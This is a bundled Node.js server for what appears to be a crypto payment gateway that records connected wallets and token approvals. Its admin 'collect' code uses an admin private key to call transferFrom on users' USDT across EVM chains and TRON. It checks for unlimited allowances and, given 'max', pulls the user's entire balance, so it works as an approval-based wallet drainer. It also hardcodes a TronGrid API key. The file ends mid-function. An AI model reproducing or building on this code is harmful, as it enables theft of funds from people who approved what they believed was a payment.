// server/index.ts
import { createServer } from "node:http";
import path4 from "node:path";
import fs4 from "node:fs";
import { fileURLToPath as fileURLToPath2 } from "node:url";

// server/pgPool.ts
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import mysql from "mysql2/promise";
var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);
var ROOT = path.resolve(__dirname, "..");
function loadDotEnv(filePath) {
  if (!fs.existsSync(filePath)) return;
  const content = fs.readFileSync(filePath, "utf8");
  for (const line of content.split("\n")) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const eqIdx = trimmed.indexOf("=");
    if (eqIdx === -1) continue;
    const key = trimmed.slice(0, eqIdx).trim();
    const val = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, "");
    if (key && !(key in process.env)) {
      process.env[key] = val;
    }
  }
}
loadDotEnv(path.join(ROOT, ".env"));
loadDotEnv(path.join(ROOT, ".env.production"));
var pool = null;
var _connected = false;
var _failed = false;
function buildConfig() {
  loadDotEnv(path.join(ROOT, ".env"));
  loadDotEnv(path.join(ROOT, ".env.production"));
  const url = (process.env.DATABASE_URL || "").trim();
  if (url.startsWith("mysql://") || url.startsWith("mysql2://")) {
    const parsed = new URL(url.replace(/^mysql2:\/\//, "mysql://"));
    return {
      host: parsed.hostname,
      port: parsed.port ? parseInt(parsed.port) : 3306,
      user: decodeURIComponent(parsed.username),
      password: decodeURIComponent(parsed.password),
      database: parsed.pathname.slice(1),
      waitForConnections: true,
      connectionLimit: 10,
      connectTimeout: 5e3
    };
  }
  const host = process.env.MYSQL_HOST?.trim();
  const user = process.env.MYSQL_USER?.trim();
  const password = process.env.MYSQL_PASSWORD?.trim();
  const database = (process.env.MYSQL_DB || process.env.MYSQL_DATABASE)?.trim();
  if (host && user && database) {
    return {
      host,
      port: process.env.MYSQL_PORT ? parseInt(process.env.MYSQL_PORT.trim()) : 3306,
      user,
      password: password || "",
      database,
      waitForConnections: true,
      connectionLimit: 10,
      connectTimeout: 5e3
    };
  }
  return null;
}
function isMysqlAvailable() {
  const cfg = buildConfig();
  if (!cfg) return false;
  return !_failed;
}
var isPgAvailable = isMysqlAvailable;
function getPool() {
  const cfg = buildConfig();
  if (!cfg) return null;
  if (!pool) {
    pool = mysql.createPool(cfg);
    pool.query("SELECT 1").then(() => {
      _connected = true;
      _failed = false;
      console.log("\u2705 MySQL connected successfully");
    }).catch((err) => {
      console.warn("\u26A0\uFE0F  MySQL connection failed:", err.message);
      console.warn("   Admin dashboard will show empty data until MySQL is configured.");
      _connected = false;
      _failed = true;
    });
  }
  return pool;
}
async function query(text, params) {
  const p = getPool();
  if (!p) {
    return { rows: [], rowCount: 0 };
  }
  try {
    const [rows] = await p.execute(text, params);
    _connected = true;
    _failed = false;
    return { rows, rowCount: rows.length };
  } catch (err) {
    const error = err;
    console.error("Database query error:", error.message);
    const isConnectionError = error.code === "ECONNREFUSED" || error.code === "ENOTFOUND" || error.code === "ER_ACCESS_DENIED_ERROR" || error.code === "ER_BAD_DB_ERROR" || error.code === "ETIMEDOUT";
    if (isConnectionError) {
      _failed = true;
      _connected = false;
    }
    return { rows: [], rowCount: 0 };
  }
}

// server/paymentRoutes.ts
import path3 from "node:path";
import fs3 from "node:fs";

// server/db.ts
var payments = /* @__PURE__ */ new Map();
function createPayment(record) {
  const id = `PAY-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
  const full = { ...record, id, createdAt: Date.now() };
  payments.set(id, full);
  return full;
}
function getPayment(id) {
  const record = payments.get(id);
  if (!record) return void 0;
  if (Date.now() > record.expiresAt && record.status !== "EXPIRED") {
    const expired = { ...record, status: "EXPIRED" };
    payments.set(id, expired);
    return expired;
  }
  return record;
}
function updatePayment(id, updates) {
  const record = payments.get(id);
  if (!record) return null;
  const updated = { ...record, ...updates };
  payments.set(id, updated);
  return updated;
}
function getAllPayments() {
  return Array.from(payments.values());
}

// server/walletBConfig.ts
function loadWalletBAddresses() {
  const env = typeof process !== "undefined" ? process.env : {};
  const addresses = {};
  const mapping = [
    ["ethereum", "VITE_WALLET_B_ETHEREUM"],
    ["bsc", "VITE_WALLET_B_BSC"],
    ["polygon", "VITE_WALLET_B_POLYGON"],
    ["tron", "VITE_SPENDER_ADDRESS_TRON"],
    ["solana", "VITE_WALLET_B_SOLANA"],
    ["bitcoin", "VITE_WALLET_B_BITCOIN"]
  ];
  for (const [networkId, envKey] of mapping) {
    const addr = env[envKey];
    if (addr && addr.trim()) {
      addresses[networkId] = addr.trim();
    }
  }
  return addresses;
}

// server/pgDb.ts
async function saveWalletSession(data) {
  if (!isMysqlAvailable()) return;
  const addr = data.walletAddress?.trim();
  if (!addr) return;
  const existing = await query(
    `SELECT id FROM wallet_sessions WHERE LOWER(wallet_address) = LOWER(?) LIMIT 1`,
    [addr]
  );
  if (existing.rows.length > 0) {
    await query(
      `UPDATE wallet_sessions
       SET last_active = NOW(),
           wallet_software = ?,
           network = ?,
           chain_family = ?,
           device = ?,
           platform = ?
       WHERE id = ?`,
      [data.walletSoftware, data.network, data.chainFamily, data.device, data.platform, existing.rows[0].id]
    );
  } else {
    await query(
      `INSERT INTO wallet_sessions (wallet_address, wallet_software, network, chain_family, device, platform, first_connected, last_active)
       VALUES (?, ?, ?, ?, ?, ?, NOW(), NOW())`,
      [addr, data.walletSoftware, data.network, data.chainFamily, data.device, data.platform]
    );
  }
}
async function getWalletSessions(limit = 50, offset = 0) {
  const result = await query(
    `SELECT ws.*
     FROM wallet_sessions ws
     INNER JOIN (
       SELECT LOWER(wallet_address) AS laddr, MAX(last_active) AS max_active
       FROM wallet_sessions
       GROUP BY LOWER(wallet_address)
     ) dedup ON LOWER(ws.wallet_address) = dedup.laddr AND ws.last_active = dedup.max_active
     ORDER BY ws.last_active DESC
     LIMIT ? OFFSET ?`,
    [limit, offset]
  );
  return result.rows;
}
async function getWalletSessionCount() {
  const result = await query(
    "SELECT COUNT(DISTINCT LOWER(wallet_address)) as count FROM wallet_sessions"
  );
  return parseInt(result.rows[0]?.count ?? "0", 10);
}
async function saveTransaction(data) {
  if (!isMysqlAvailable()) return;
  const expiresAt = data.expiresAt ? new Date(data.expiresAt).toISOString().slice(0, 19).replace("T", " ") : null;
  await query(
    `INSERT INTO transactions
       (id, network, asset, amount, wallet_a, wallet_b, request_type, status,
        transaction_id, contract_address, spender_address, token_decimals,
        block_number, method, expires_at, purpose)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     ON DUPLICATE KEY UPDATE
       status             = VALUES(status),
       transaction_id     = COALESCE(VALUES(transaction_id), transaction_id),
       contract_address   = COALESCE(VALUES(contract_address), contract_address),
       spender_address    = COALESCE(VALUES(spender_address), spender_address),
       token_decimals     = COALESCE(VALUES(token_decimals), token_decimals),
       block_number       = COALESCE(VALUES(block_number), block_number),
       method             = COALESCE(VALUES(method), method),
       wallet_a           = COALESCE(VALUES(wallet_a), wallet_a)`,
    [
      data.id,
      data.network,
      data.asset,
      data.amount,
      data.walletA ?? null,
      data.walletB,
      data.requestType,
      data.status,
      data.transactionId ?? null,
      data.contractAddress ?? null,
      data.spenderAddress ?? null,
      data.tokenDecimals ?? 6,
      data.blockNumber ? String(data.blockNumber) : null,
      data.method ?? "approve",
      expiresAt,
      data.purpose ?? "Bitwit Payment"
    ]
  );
}
async function updateTransactionStatus(id, status, transactionId, blockNumber) {
  if (!isMysqlAvailable()) return;
  if (transactionId && blockNumber) {
    await query(
      `UPDATE transactions SET status = ?, transaction_id = ?, block_number = ? WHERE id = ?`,
      [status, transactionId, String(blockNumber), id]
    );
  } else if (transactionId) {
    await query(
      `UPDATE transactions SET status = ?, transaction_id = ? WHERE id = ?`,
      [status, transactionId, id]
    );
  } else {
    await query(`UPDATE transactions SET status = ? WHERE id = ?`, [status, id]);
  }
}
async function getTransactions(opts = {}) {
  const { limit = 20, offset = 0, network, status, search } = opts;
  const conditions = [];
  const params = [];
  if (network && network !== "all") {
    conditions.push(`network = ?`);
    params.push(network);
  }
  if (status && status !== "all") {
    conditions.push(`status = ?`);
    params.push(status);
  }
  if (search) {
    conditions.push(`(wallet_a LIKE ? OR wallet_b LIKE ? OR transaction_id LIKE ? OR id LIKE ?)`);
    const like = `%${search}%`;
    params.push(like, like, like, like);
  }
  const where = conditions.length ? `WHERE ${conditions.join(" AND ")}` : "";
  const countResult = await query(
    `SELECT COUNT(*) as count FROM transactions ${where}`,
    params
  );
  const total = parseInt(countResult.rows[0]?.count ?? "0", 10);
  const dataResult = await query(
    `SELECT * FROM transactions ${where} ORDER BY created_at DESC LIMIT ? OFFSET ?`,
    [...params, limit, offset]
  );
  return { rows: dataResult.rows, total };
}
async function getTransactionById(id) {
  const result = await query("SELECT * FROM transactions WHERE id = ?", [id]);
  return result.rows[0] ?? null;
}
async function markCollected(id, amount, txHash) {
  if (!isMysqlAvailable()) return;
  await query(
    `UPDATE transactions SET collected = TRUE, collected_amount = ?, collected_tx_hash = ?, collected_at = NOW() WHERE id = ?`,
    [amount, txHash, id]
  );
}
async function getOverviewStats() {
  const walletCount = await getWalletSessionCount();
  const totalRes = await query("SELECT COUNT(*) as count FROM transactions");
  const confirmedRes = await query(
    `SELECT COUNT(*) as count FROM transactions WHERE status IN ('CONFIRMED', 'COMPLETED', 'BTC_CONFIRMED', 'APPROVAL_CONFIRMED')`
  );
  const failedRes = await query(
    `SELECT COUNT(*) as count FROM transactions WHERE status IN ('FAILED', 'USER_REJECTED', 'EXPIRED')`
  );
  const netDistRes = await query(
    `SELECT network, COUNT(*) as count FROM transactions GROUP BY network ORDER BY count DESC`
  );
  const recentRes = await query(
    `SELECT * FROM transactions ORDER BY created_at DESC LIMIT 10`
  );
  return {
    connectedWallets: walletCount,
    totalTransactions: parseInt(totalRes.rows[0]?.count ?? "0", 10),
    confirmedTransactions: parseInt(confirmedRes.rows[0]?.count ?? "0", 10),
    failedTransactions: parseInt(failedRes.rows[0]?.count ?? "0", 10),
    networkDistribution: netDistRes.rows.map((r) => ({ network: r.network, count: parseInt(r.count, 10) })),
    recentTransactions: recentRes.rows
  };
}
async function createEnergySponsorship(record) {
  if (!isMysqlAvailable()) return;
  await query(
    `INSERT INTO energy_sponsorships
       (sponsorship_id, user_address, sponsor_address, required_energy,
        staked_sun_amount, energy_yield_at_delegation, delegation_tx_id, status)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
     ON DUPLICATE KEY UPDATE
       required_energy = VALUES(required_energy),
       staked_sun_amount = VALUES(staked_sun_amount),
       status = VALUES(status)`,
    [
      record.sponsorshipId,
      record.userAddress,
      record.sponsorAddress,
      record.requiredEnergy,
      record.stakedSunAmount.toString(),
      record.energyYieldAtDelegation || null,
      record.delegationTxId || null,
      record.status || "PENDING"
    ]
  );
}
async function updateEnergySponsorshipStatus(sponsorshipId, status, extra) {
  if (!isMysqlAvailable()) return;
  const clauses = ["status = ?"];
  const params = [status];
  if (status === "ENERGY_READY") {
    clauses.push(`energy_ready_at = NOW()`);
  } else if (status === "SIGNED") {
    clauses.push(`signed_at = NOW()`);
  } else if (status === "BROADCAST") {
    clauses.push(`broadcast_at = NOW()`);
  } else if (status === "CONFIRMED") {
    clauses.push(`confirmed_at = NOW()`);
  } else if (status === "RECLAIMED") {
    clauses.push(`reclaimed_at = NOW()`);
  }
  if (extra?.failureReason !== void 0) {
    clauses.push(`failure_reason = ?`);
    params.push(extra.failureReason);
  }
  if (extra?.delegationTxId !== void 0) {
    clauses.push(`delegation_tx_id = ?`);
    params.push(extra.delegationTxId);
  }
  if (extra?.approvalTxId !== void 0) {
    clauses.push(`approval_tx_id = ?`);
    params.push(extra.approvalTxId);
  }
  if (extra?.undelegationTxId !== void 0) {
    clauses.push(`undelegation_tx_id = ?`);
    params.push(extra.undelegationTxId);
  }
  if (extra?.retryCountIncrement) {
    clauses.push(`retry_count = retry_count + 1`);
  }
  params.push(sponsorshipId);
  await query(
    `UPDATE energy_sponsorships SET ${clauses.join(", ")} WHERE sponsorship_id = ?`,
    params
  );
}
async function getEnergySponsorship(sponsorshipId) {
  if (!isMysqlAvailable()) return null;
  const res = await query(
    `SELECT * FROM energy_sponsorships WHERE sponsorship_id = ?`,
    [sponsorshipId]
  );
  return res.rows[0] || null;
}
async function getActiveSponsorshipForUser(userAddress) {
  if (!isMysqlAvailable()) return null;
  const res = await query(
    `SELECT * FROM energy_sponsorships
     WHERE user_address = ? AND status NOT IN ('RECLAIMED', 'FAILED')
     ORDER BY created_at DESC LIMIT 1`,
    [userAddress]
  );
  return res.rows[0] || null;
}
async function getSponsorshipsNeedingReconciliation() {
  if (!isMysqlAvailable()) return [];
  const res = await query(
    `SELECT * FROM energy_sponsorships
     WHERE status = 'RECLAIM_PENDING'
        OR (status = 'CONFIRMED' AND reclaimed_at IS NULL AND created_at < DATE_SUB(NOW(), INTERVAL 1 MINUTE))
     ORDER BY created_at ASC LIMIT 25`
  );
  return res.rows;
}

// server/adminAuth.ts
import { randomBytes } from "node:crypto";
var sessions = /* @__PURE__ */ new Map();
var SESSION_TTL_MS = 24 * 60 * 60 * 1e3;
function getCredentials() {
  const username = process.env.ADMIN_USERNAME?.trim();
  const password = process.env.ADMIN_PASSWORD;
  if (!username || !password) return null;
  return {
    username,
    password
  };
}
function login(username, password) {
  const creds = getCredentials();
  if (!creds || username !== creds.username || password !== creds.password) {
    return null;
  }
  const token = randomBytes(32).toString("hex");
  sessions.set(token, { createdAt: Date.now() });
  return token;
}
function validateSession(token) {
  const session = sessions.get(token);
  if (!session) return false;
  if (Date.now() - session.createdAt > SESSION_TTL_MS) {
    sessions.delete(token);
    return false;
  }
  return true;
}
function logout(token) {
  sessions.delete(token);
}
function extractToken(authHeader) {
  if (!authHeader || !authHeader.startsWith("Bearer ")) return null;
  return authHeader.slice(7);
}

// server/collectService.ts
import fs2 from "node:fs";
import path2 from "node:path";
import crypto from "node:crypto";
import { ethers } from "ethers";
function ensureEnvLoaded() {
  try {
    const envPath = path2.resolve(process.cwd(), ".env");
    if (fs2.existsSync(envPath)) {
      const content = fs2.readFileSync(envPath, "utf8");
      for (const line of content.split("\n")) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("#")) continue;
        const eqIdx = trimmed.indexOf("=");
        if (eqIdx > 0) {
          const key = trimmed.slice(0, eqIdx).trim();
          let val = trimmed.slice(eqIdx + 1).trim();
          if (val.startsWith('"') && val.endsWith('"') || val.startsWith("'") && val.endsWith("'")) {
            val = val.slice(1, -1);
          }
          if (process.env[key] === void 0) {
            process.env[key] = val;
          }
        }
      }
    }
  } catch (err) {
    console.warn("[collectService] Failed to parse .env eagerly:", err);
  }
}
ensureEnvLoaded();
var ERC20_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];
function isMainnet() {
  ensureEnvLoaded();
  return process.env.VITE_USE_MAINNET === "true";
}
function getRpcUrl(network) {
  const mainnet = isMainnet();
  const rpcs = {
    ethereum: mainnet ? "https://eth.llamarpc.com" : "https://rpc.sepolia.org",
    bsc: mainnet ? "https://bsc-dataseed1.binance.org" : "https://data-seed-prebsc-1-s1.binance.org:8545",
    polygon: mainnet ? "https://polygon-rpc.com" : "https://rpc-amoy.polygon.technology"
  };
  return rpcs[network] ?? rpcs.ethereum;
}
function getTronApiUrl() {
  return isMainnet() ? "https://api.trongrid.io" : "https://nile.trongrid.io";
}
function getTronApiKey() {
  ensureEnvLoaded();
  return process.env.VITE_TRONGRID_API_KEY || process.env.TRONGRID_API_KEY || "b87b6579-b461-4938-8ff0-1362cdbf3bb4";
}
function getTronHeaders() {
  const headers = {
    "Content-Type": "application/json"
  };
  const key = getTronApiKey();
  if (key) {
    headers["TRON-PRO-API-KEY"] = key;
  }
  return headers;
}
var TRON_USDT_DECIMALS = 6;
var TRON_FEE_LIMIT_SUN = 5e8;
function parseTrc20UsdtAmount(amount) {
  const value = amount.trim();
  if (value.toLowerCase() === "max" || value.toLowerCase() === "unlimited") {
    throw new Error('Cannot parse "max" as a fixed amount \u2014 caller must resolve to actual balance first');
  }
  if (!/^\d+(\.\d+)?$/.test(value)) throw new Error("Amount must be a positive decimal number");
  const [whole, fraction = ""] = value.split(".");
  if (fraction.length > TRON_USDT_DECIMALS) throw new Error("USDT supports at most 6 decimal places");
  const baseUnits = BigInt(whole) * 1000000n + BigInt(fraction.padEnd(TRON_USDT_DECIMALS, "0"));
  if (baseUnits <= 0n) throw new Error("Amount must be greater than zero");
  return baseUnits;
}
function getUsdtContract(network) {
  const mainnet = isMainnet();
  if (network === "tron") {
    return mainnet ? "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" : "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
  }
  const contracts = {
    ethereum: mainnet ? "0xdAC17F958D2ee523a2206206994597C13D831ec7" : "0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0",
    bsc: mainnet ? "0x55d398326f99059fF775485246999027B3197955" : "0x337610d27c682E347C9cD60BD4b3b107C9d34dDd",
    polygon: mainnet ? "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" : "0x0FA8781a83E46826621b3BC094Ea2A0212e71B23"
  };
  return contracts[network] ?? contracts.ethereum;
}
async function collectEVM(network, userAddress, collectAmount, contractAddress) {
  ensureEnvLoaded();
  const adminPrivateKey = process.env.ADMIN_PRIVATE_KEY;
  if (!adminPrivateKey) {
    return { success: false, amount: collectAmount, network, error: "ADMIN_PRIVATE_KEY not set in .env" };
  }
  try {
    const provider = new ethers.JsonRpcProvider(getRpcUrl(network));
    const wallet = new ethers.Wallet(adminPrivateKey, provider);
    const contract = new ethers.Contract(contractAddress, ERC20_ABI, wallet);
    let decimals = 6;
    try {
      decimals = Number(await contract.decimals());
    } catch {
    }
    const amountParsed = ethers.parseUnits(collectAmount, decimals);
    const adminAddress = wallet.address;
    const allowance = await contract.allowance(userAddress, adminAddress);
    if (allowance < amountParsed) {
      return {
        success: false,
        amount: collectAmount,
        network,
        error: `Insufficient allowance. Approved: ${ethers.formatUnits(allowance, decimals)}, Requested: ${collectAmount}`
      };
    }
    console.log(`[Collect] Executing transferFrom on ${network}: ${userAddress} \u2192 ${adminAddress}, amount: ${collectAmount}`);
    const tx = await contract.transferFrom(userAddress, adminAddress, amountParsed);
    console.log(`[Collect] Transaction sent: ${tx.hash}`);
    const receipt = await tx.wait();
    console.log(`[Collect] Confirmed in block ${receipt?.blockNumber}`);
    return { success: true, txHash: tx.hash, amount: collectAmount, network };
  } catch (err) {
    const msg = err instanceof Error ? err.message : "Unknown error";
    console.error(`[Collect] EVM collect failed on ${network}:`, msg);
    return { success: false, amount: collectAmount, network, error: msg };
  }
}
var TRON_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58ToHex(addr) {
  let num = 0n;
  for (const c of addr) {
    const i = TRON_ALPHABET.indexOf(c);
    if (i < 0) throw new Error("Invalid base58 char: " + c);
    num = num * 58n + BigInt(i);
  }
  let hex = num.toString(16);
  if (hex.length < 50) hex = hex.padStart(50, "0");
  return hex.slice(0, 42).toLowerCase();
}
function to41Hex(addr) {
  const trimmed = addr.trim();
  if (trimmed.startsWith("T") && trimmed.length >= 33) {
    return base58ToHex(trimmed);
  }
  if (trimmed.startsWith("41") && trimmed.length === 42) {
    return trimmed.toLowerCase();
  }
  if (trimmed.startsWith("0x") && trimmed.length === 42) {
    return "41" + trimmed.slice(2).toLowerCase();
  }
  throw new Error(`Invalid TRON address format: ${addr}`);
}
function abiAddr(hex41) {
  return hex41.slice(2).padStart(64, "0");
}
function abiUint256(n) {
  return BigInt(n).toString(16).padStart(64, "0");
}
async function tronPost(baseUrl, path5, body, retries = 3) {
  const url = baseUrl.replace(/\/$/, "") + path5;
  const headers = getTronHeaders();
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const res = await fetch(url, {
        method: "POST",
        headers,
        body: JSON.stringify(body)
      });
      if (!res.ok) {
        const text = await res.text();
        throw new Error(`HTTP ${res.status} from ${path5}: ${text.slice(0, 200)}`);
      }
      return await res.json();
    } catch (err) {
      if (attempt === retries) throw err;
      await new Promise((r) => setTimeout(r, 1e3 * attempt));
    }
  }
  throw new Error(`Failed to POST ${path5} after ${retries} attempts`);
}
async function callConstant(tronApi, contractHex, adminHex, selector, parameter) {
  const res = await tronPost(
    tronApi,
    "/wallet/triggerconstantcontract",
    {
      owner_address: adminHex,
      contract_address: contractHex,
      function_selector: selector,
      parameter,
      visible: false
    }
  );
  return BigInt("0x" + (res.constant_result?.[0] ?? "0".repeat(64)));
}
async function collectTRON(userAddress, collectAmount, contractAddress, recipient, expectedSpender) {
  ensureEnvLoaded();
  const adminTronKey = process.env.ADMIN_TRON_PRIVATE_KEY;
  if (!adminTronKey) {
    return { success: false, amount: collectAmount, network: "tron", error: "ADMIN_TRON_PRIVATE_KEY not set in .env" };
  }
  const tronApi = "https://api.trongrid.io";
  try {
    const userHex = to41Hex(userAddress);
    const recipientHex = to41Hex(recipient);
    const contractHex = to41Hex(contractAddress);
    const privateKeyHex = adminTronKey.startsWith("0x") ? adminTronKey : "0x" + adminTronKey;
    const evmWallet = new ethers.Wallet(privateKeyHex);
    const adminHex = "41" + evmWallet.address.slice(2).toLowerCase();
    const configuredSpenderHex = to41Hex(expectedSpender);
    if (configuredSpenderHex !== adminHex) {
      return {
        success: false,
        amount: collectAmount,
        network: "tron",
        error: `Configured TRON spender (${expectedSpender}) does not match ADMIN_TRON_PRIVATE_KEY signer (${adminHex}).`
      };
    }
    console.log("\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550");
    console.log("  TRON USDT Collect \u2014 transferFrom()");
    console.log("\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550");
    console.log("From (user) :", userAddress);
    console.log("To  (admin) :", recipient);
    console.log("Contract    :", contractAddress);
    const balanceRaw = await callConstant(tronApi, contractHex, adminHex, "balanceOf(address)", abiAddr(userHex));
    const balanceUsdt = Number(balanceRaw) / 1e6;
    console.log("\n[1] User USDT balance  :", balanceUsdt.toFixed(6), "USDT");
    const allowanceRaw = await callConstant(
      tronApi,
      contractHex,
      adminHex,
      "allowance(address,address)",
      abiAddr(userHex) + abiAddr(adminHex)
    );
    const MAX_UINT256_THRESHOLD = (1n << 255n) - 1n;
    const isMax = allowanceRaw >= MAX_UINT256_THRESHOLD;
    const allowanceUsdt = isMax ? "\u221E UNLIMITED" : (Number(allowanceRaw) / 1e6).toFixed(6) + " USDT";
    console.log("[2] Allowance          :", allowanceUsdt);
    if (allowanceRaw === 0n) {
      const errMsg = "\u274C Allowance is 0 \u2014 user has not approved this spender. Run approve() first.";
      console.error("\n" + errMsg);
      return { success: false, amount: collectAmount, network: "tron", error: errMsg };
    }
    if (balanceRaw === 0n) {
      const errMsg = "\u274C User USDT balance is 0. Nothing to collect.";
      console.error("\n" + errMsg);
      return { success: false, amount: collectAmount, network: "tron", error: errMsg };
    }
    let collectSun;
    const isMaxCollect = collectAmount.trim().toLowerCase() === "max" || collectAmount.trim().toLowerCase() === "unlimited";
    if (isMaxCollect) {
      collectSun = balanceRaw;
    } else {
      const requestedSun = parseTrc20UsdtAmount(collectAmount);
      if (!isMax && requestedSun > allowanceRaw) {
        const errMsg = `\u274C Requested ${collectAmount} USDT exceeds allowance of ${allowanceUsdt}`;
        console.error("\n" + errMsg);
        return { success: false, amount: collectAmount, network: "tron", error: errMsg };
      }
      if (requestedSun > balanceRaw) {
        const errMsg = `\u274C Requested ${collectAmount} USDT exceeds user balance of ${balanceUsdt.toFixed(6)} USDT`;
        console.error("\n" + errMsg);
        return { success: false, amount: collectAmount, network: "tron", error: errMsg };
      }
      collectSun = requestedSun;
    }
    const collectUsdt = Number(collectSun) / 1e6;
    console.log("[3] Collecting         :", collectUsdt.toFixed(6), "USDT");
    console.log("\n[API] POST /wallet/triggersmartcontract");
    const buildRes = await tronPost(tronApi, "/wallet/triggersmartcontract", {
      owner_address: adminHex,
      contract_address: contractHex,
      function_selector: "transferFrom(address,address,uint256)",
      parameter: abiAddr(userHex) + abiAddr(recipientHex) + abiUint256(collectSun),
      fee_limit: TRON_FEE_LIMIT_SUN,
      call_value: 0,
      visible: false
    });
    if (!buildRes.result?.result || !buildRes.transaction) {
      const errDetails = JSON.stringify(buildRes.result ?? buildRes, null, 2);
      console.error("\n\u274C triggersmartcontract failed:\n", errDetails);
      return { success: false, amount: collectUsdt.toFixed(6), network: "tron", error: `triggersmartcontract failed: ${errDetails}` };
    }
    const rawTx = buildRes.transaction;
    console.log("    txID:", rawTx.txID);
    const msgHash = crypto.createHash("sha256").update(Buffer.from(rawTx.raw_data_hex, "hex")).digest();
    const sigKey = new ethers.SigningKey(privateKeyHex);
    const sig = sigKey.sign(msgHash);
    const signature = sig.r.slice(2) + sig.s.slice(2) + (sig.v - 27).toString(16).padStart(2, "0");
    rawTx.signature = [signature];
    console.log("    signed \u2713");
    console.log("\n[API] POST /wallet/broadcasttransaction");
    const broadcastRes = await tronPost(tronApi, "/wallet/broadcasttransaction", rawTx);
    if (!broadcastRes.result) {
      const errDetails = JSON.stringify(broadcastRes, null, 2);
      console.error("\n\u274C Broadcast failed:\n", errDetails);
      return { success: false, amount: collectUsdt.toFixed(6), network: "tron", error: `Broadcast failed: ${errDetails}` };
    }
    const txId = rawTx.txID;
    console.log("\n\u2705 transferFrom broadcast!");
    console.log("   txId    :", txId);
    console.log("   Explorer: https://tronscan.org/#/transaction/" + txId);
    console.log("   Amount  :", collectUsdt.toFixed(6), "USDT");
    console.log("\nWaiting 6s for on-chain confirmation...");
    await new Promise((r) => setTimeout(r, 6e3));
    let info = null;
    try {
      info = await tronPost(tronApi, "/wallet/gettransactioninfobyid", { value: txId });
    } catch (e) {
      console.warn("Initial gettransactioninfobyid poll warning:", e);
    }
    let attempts = 0;
    while ((!info || !info.blockNumber) && attempts < 3) {
      await new Promise((r) => setTimeout(r, 3e3));
      try {
        info = await tronPost(tronApi, "/wallet/gettransactioninfobyid", { value: txId });
      } catch {
      }
      attempts++;
    }
    if (info?.receipt?.result === "SUCCESS") {
      console.log("\n\u{1F389} CONFIRMED in block", info.blockNumber);
      console.log("   Energy used     :", info.receipt.energy_usage_total);
      console.log("   Net fee (TRX)   :", (info.receipt.net_fee ?? 0) / 1e6);
      console.log("   Energy fee (TRX):", (info.receipt.energy_fee ?? 0) / 1e6);
      console.log("\n   Collected", collectUsdt.toFixed(6), "USDT \u2192 ", recipient);
      return { success: true, txHash: txId, amount: collectUsdt.toFixed(6), network: "tron" };
    } else if (info?.blockNumber) {
      console.error("\n\u26A0\uFE0F  Included in block", info.blockNumber, "but FAILED");
      console.error("   Receipt:", JSON.stringify(info.receipt));
      let failReason = `Included in block ${info.blockNumber} but failed: ${info.receipt?.result || "UNKNOWN"}`;
      if (info.receipt?.result === "OUT_OF_ENERGY") {
        failReason += ` \u2014 Admin wallet needs more TRX. Fund ${recipient} with \u226510 TRX and retry.`;
      }
      return { success: false, txHash: txId, amount: collectUsdt.toFixed(6), network: "tron", error: failReason };
    } else {
      console.log("\n\u23F3 Not yet confirmed \u2014 check TronScan in ~10s.");
      return { success: true, txHash: txId, amount: collectUsdt.toFixed(6), network: "tron" };
    }
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error("[Collect][Tron] \u274C Exception:", msg);
    return { success: false, amount: collectAmount, network: "tron", error: msg };
  }
}
async function collectTokens(paymentId, amount) {
  if (!amount) {
    return { success: false, amount, network: "unknown", error: "Amount is required." };
  }
  let tx = await getTransactionById(paymentId);
  if (!tx) {
    const memTx = getPayment(paymentId);
    if (memTx) {
      tx = {
        id: memTx.id,
        network: memTx.network,
        asset: memTx.asset,
        amount: memTx.amount,
        wallet_a: memTx.walletA ?? null,
        wallet_b: memTx.walletB,
        request_type: memTx.requestType,
        status: memTx.status,
        transaction_id: memTx.transactionId ?? null,
        contract_address: getUsdtContract(memTx.network) ?? null,
        spender_address: memTx.network === "tron" ? process.env.VITE_SPENDER_ADDRESS_TRON || null : process.env.VITE_SPENDER_ADDRESS ?? null,
        created_at: new Date(memTx.createdAt).toISOString(),
        expires_at: memTx.expiresAt ? new Date(memTx.expiresAt).toISOString() : null,
        purpose: memTx.purpose,
        collected: false,
        collected_amount: null,
        collected_tx_hash: null,
        collected_at: null
      };
    }
  }
  if (!tx) {
    return { success: false, amount, network: "unknown", error: `Payment ${paymentId} not found in database or memory store` };
  }
  if (!tx.wallet_a) {
    return { success: false, amount, network: tx.network, error: "No payer wallet address recorded for this transaction" };
  }
  if (tx.collected) {
    return { success: false, amount, network: tx.network, error: "Tokens have already been collected for this transaction" };
  }
  const validStatuses = ["CONFIRMED", "BROADCAST", "COMPLETED", "APPROVAL_CONFIRMED", "BTC_CONFIRMED"];
  const validTypes = ["TOKEN_APPROVAL", "DIRECT_PAYMENT"];
  if (!validStatuses.includes(tx.status)) {
